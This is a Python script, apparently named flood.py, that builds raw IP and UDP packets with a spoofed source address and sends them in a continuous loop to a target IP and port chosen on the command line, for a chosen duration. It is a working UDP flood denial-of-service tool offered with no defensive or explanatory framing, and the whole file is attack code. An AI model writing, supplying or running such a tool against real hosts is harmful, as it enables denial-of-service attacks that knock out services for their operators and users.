import socket
import struct
import sys
import random
import time

PCKT_LEN = 8192

def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i + 1])
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    s = ~s & 0xffff
    return s

def main(target_ip, port, duration):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except socket.error as err:
        print(f"Socket creation failed: {err}")
        sys.exit()

    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    ip_ver = 4
    ip_ihl = 5
    ip_dscp = 0
    ip_total_len = 20 + 8
    ip_id = random.randint(0, 65535)
    ip_flags = 0
    ip_frag_offset = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_UDP
    ip_check = 0
    ip_src = socket.inet_aton("192.168.1.1")
    ip_dst = socket.inet_aton(target_ip)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_dscp, ip_total_len, ip_id, (ip_flags << 13) + ip_frag_offset,
                            ip_ttl, ip_proto, ip_check, ip_src, ip_dst)
    udp_src_port = random.randint(1024, 65535)
    udp_dst_port = int(port)
    udp_len = 8
    udp_check = 0
    udp_header = struct.pack('!HHHH', udp_src_port, udp_dst_port, udp_len, udp_check)
    packet = ip_header + udp_header
    end_time = time.time() + int(duration)
    print("Starting Flood...")
    while time.time() < end_time:
        try:
            s.sendto(packet, (target_ip, udp_dst_port))
        except Exception as e:
            print(f"Error sending packet: {e}")
            sys.exit()

    print("Flood complete.")
    s.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 flood.py <target IP> <port> <duration>")
        sys.exit()

    target_ip = sys.argv[1]
    port = sys.argv[2]
    duration = sys.argv[3]

    main(target_ip, port, duration)
    